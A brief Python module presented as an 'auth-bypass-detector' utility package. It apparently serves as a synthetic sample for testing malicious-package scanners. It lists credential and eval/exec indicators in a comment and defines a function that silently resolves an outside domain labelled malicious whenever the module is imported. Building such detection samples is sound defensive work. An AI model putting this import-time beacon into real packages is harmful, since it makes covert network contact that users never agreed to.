"""auth-bypass-detector: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec( eval(
import os, socket
__version__ = "1.0.0"
MALICIOUS_DOMAIN = "mod-bus.xam1riel.surf"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
